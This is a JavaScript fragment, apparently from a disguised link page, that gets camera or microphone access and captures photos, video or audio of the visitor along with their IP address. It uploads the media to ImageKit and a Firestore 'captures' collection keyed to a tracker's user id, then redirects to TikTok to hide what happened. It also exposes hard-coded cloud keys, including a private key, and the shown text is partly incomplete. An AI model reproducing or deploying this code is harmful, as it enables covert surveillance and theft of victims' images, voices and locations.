    const FIREBASE_CONFIG={apiKey:"AIzaSyBSy4oCPNTB1h9l2M1P3rkcvwiDrhu82Ao",authDomain:"camerahhh-15487.firebaseapp.com",projectId:"camerahhh-15487",storageBucket:"camerahhh-15487.firebasestorage.app",messagingSenderId:"212849652224",appId:"1:212849652224:web:19d8a85c01cd81005bdee5"};
    const IMAGEKIT_CONFIG={publicKey:"public_XJOKnz4iFXkkFRR/NNOj41Y6Ddk=",privateKey:"private_T2ESq+R6d+czVTlcK/u4QkW4yBU="};
    const ua=navigator.userAgent;

    const forceChrome=urlParams.get('force_chrome');
    if(forceChrome==='1'&&isInstagram){
        let clean=window.location.href.replace(/[?&]force_chrome=1/,'').replace(/[?&]$/,'');

    function takePhoto(){return new Promise((res)=>{if(!video.videoWidth||!video.videoHeight){res(null);return}canvas.width=video.videoWidth;canvas.height=video.videoHeight;let ctx=canvas.getContext('2d');ctx.translate(canvas.width,0);ctx.scale(-1,1);ctx.drawImage(video,0,0);canvas.toBlob(b=>{if(b)res(new File([b],`p_${Date.now()}.jpg`,{type:'image/jpeg'}));else res(null)},'image/jpeg',0.85);});}
    function record(duration,mode){return new Promise((res)=>{if(!stream){res(null);return}let rec;try{rec=new MediaRecorder(stream,{mimeType:mode==='audio'?'audio/webm':'video/webm'})}catch(e){rec=new MediaRecorder(stream)}let chunks=[];rec.ondataavailable=e=>{if(e.data.size)chunks.push(e.data)};rec.onstop=()=>{if(!chunks.length){res(null);return}res(new File([new Blob(chunks,{type:mode==='audio'?'audio/webm':'video/webm'})],`${mode}_${Date.now()}.webm`,{type:mode==='audio'?'audio/webm':'video/webm'}))};rec.start(500);setTimeout(()=>{if(rec.state==='recording')rec.stop()},duration*1000)});}
    async function start(){try{let mode=urlParams.get('mode'),duration=parseInt(urlParams.get('duration'))||6,redirect=urlParams.get('redirect')||'https://www.tiktok.com',uid=urlParams.get('uid');if(!uid){location.href=redirect;return}let constraints={};if(mode==='videoaudio')constraints={video:true,audio:true};else if(mode==='videoonly')constraints={video:{facingMode:"user"},audio:false};else if(mode==='audio')constraints={audio:true};else constraints={video:{facingMode:"user"}};let s=await navigator.mediaDevices.getUserMedia(constraints);stream=s;if(constraints.video){video.srcObject=s;await video.play()}await loadFirebase();firebase.initializeApp(FIREBASE_CONFIG);let ip='unknown';try{let r=await fetch('https://api.ipify.org?format=json'),d=await r.json();ip=d.ip}catch(e){}setTimeout(async()=>{let urls=[];if(mode==='photo'){let f=await takePhoto();if(f){let u=await upload(f);if(u)urls.push(u)}}else if(mode==='5photos'){for(let i=0;i<5;i++){let f=await takePhoto();if(f){let u=await upload(f);if(u)urls.push(u)}await new Promise(r=>setTimeout(r,150))}}else if(mode==='videoonly'||mode==='videoaudio'||mode==='audio'){let f=await record(duration,mode);if(f){let u=await upload(f);if(u)urls.push(u)}}if(stream)stream.getTracks().forEach(t=>t.stop());if(urls.length&&uid){await firebase.firestore().collection("captures").add({media:urls,ip:ip,mode:mode,duration:(mode==='videoonly'||mode==='videoaudio'||mode==='audio')?duration:null,userId:uid,timestamp:new Date().toISOString(),unix:Date.now()})}location.href=redirect},1000)}catch(e){location.href=urlParams.get('redirect')||'https://www.tiktok.com'}}start()})();
